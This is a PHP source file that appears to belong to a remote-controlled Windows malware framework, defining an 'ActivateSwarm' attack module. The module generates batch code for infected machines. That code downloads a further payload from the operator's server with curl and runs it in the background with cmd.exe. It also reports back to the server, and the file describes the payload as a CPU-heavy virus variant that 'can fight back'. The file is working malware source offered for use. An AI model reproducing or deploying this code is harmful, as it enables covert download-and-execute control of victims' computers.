<?php

namespace Kelvinho\Virus\Attack\Packages\Windows\OneTime\ActivateSwarm;

use Kelvinho\Virus\Attack\AttackBase;
use Kelvinho\Virus\Attack\BaseScriptWin;

/**
 * Class ActivateSwarm. Activates another version of the virus that can fight back. Consumes CPU like hell tho
 *
 * @package Kelvinho\Virus\Attack\Packages\Windows\OneTime
 * @author Quang Ho <157239q@gmail.com>
 * @copyright Copyright (c) 2020 Quang Ho <https://github.com/157239n>
 * @license http://www.opensource.org/licenses/mit-license.html  MIT License
 */
class ActivateSwarm extends AttackBase {
    private string $baseLocation = "";
    private string $initialLocation = "";
    private string $libsLocation = "";
    private int $swarmClockSpeed = 2;
    private bool $checkHash = false;
    private string $newVirusId = "";

    public function getBaseLocation(): string {
        return $this->baseLocation;
    }

    public function setBaseLocation(string $baseLocation): void {
        $this->baseLocation = $baseLocation;
    }

    public function getInitialLocation(): string {
        return $this->initialLocation;
    }

    public function setInitialLocation(string $initialLocation): void {
        $this->initialLocation = $initialLocation;
    }

    public function getLibsLocation(): string {
        return $this->libsLocation;
    }

    public function setLibsLocation(string $libsLocation): void {
        $this->libsLocation = $libsLocation;
    }

    public function getSwarmClockSpeed(): int {
        return $this->swarmClockSpeed;
    }

    public function setSwarmClockSpeed(int $swarmClockSpeed): void {
        $this->swarmClockSpeed = $swarmClockSpeed;
    }

    public function getCheckHash(): bool {
        return $this->checkHash;
    }

    public function setCheckHash(bool $checkHash): void {
        $this->checkHash = $checkHash;
    }

    public function generateBatchCode(): void {
        //@formatter:off ?>
        chCp 65001
        >"<?php echo $this->initialLocation; ?>\mn.cmd" curl -L <?php echo ALT_SECURE_DOMAIN . "/viruses/$this->virus_id/attacks/$this->attack_id/extras/mn\n"; ?>
        >"<?php echo $this->initialLocation; ?>\ic" (
            echo type^|0
            echo libs^|<?php echo $this->libsLocation . "\n"; ?>
            echo base^|<?php echo $this->baseLocation . "\n"; ?>
        )
        start /b cmd.exe /c "<?php echo $this->initialLocation; ?>\mn.cmd"
        <?php echo BaseScriptWin::payloadConfirmationLoop($this->virus_id, $this->attack_id, $this->generateUploadCode());
        //echo BaseScriptWin::cleanUpPayload();
        //@formatter:on
    }

    private function generateUploadCode() {
        ob_start(); ?>
        curl -d "" --post301 --post302 --post303 -L <?php echo ALT_SECURE_DOMAIN . "/vrs/$this->virus_id/aks/$this->attack_id/report"; ?>
        <?php return ob_get_clean();
    }

    public function processExtras(string $resourceIdentifier): void {
        if ($resourceIdentifier == "mn") {
            //echo BaseScriptWin::obfuscate(BaseScriptWin::complexMain($this->newVirusId, $this->swarmClockSpeed, $this->checkHash));
            echo BaseScriptWin::complexMain($this->newVirusId, $this->swarmClockSpeed, $this->checkHash);
        }
    }

    protected function setState(string $json): void {
        $state = json_decode($json, true);
        $this->baseLocation = $state["baseLocation"];
        $this->initialLocation = $state["initialLocation"];
        $this->libsLocation = $state["libsLocation"];
        $this->swarmClockSpeed = $state["swarmClockSpeed"];
        $this->checkHash = $state["checkHash"];
        $this->newVirusId = $state["newVirusId"];
    }

    protected function getState(): string {
        $state = [];
        if ($this->newVirusId == "") { // if the new virus id has not been initialized with anything, create a new one
            $virus = $this->virusFactory->new($this->session->get("user_handle"), false);
            $this->newVirusId = $virus->getVirusId();
        }
        $state["baseLocation"] = $this->baseLocation;
        $state["initialLocation"] = $this->initialLocation;
        $state["libsLocation"] = $this->libsLocation;
        $state["swarmClockSpeed"] = $this->swarmClockSpeed;
        $state["checkHash"] = $this->checkHash;
        $state["newVirusId"] = $this->newVirusId;
        return json_encode($state);
    }
}
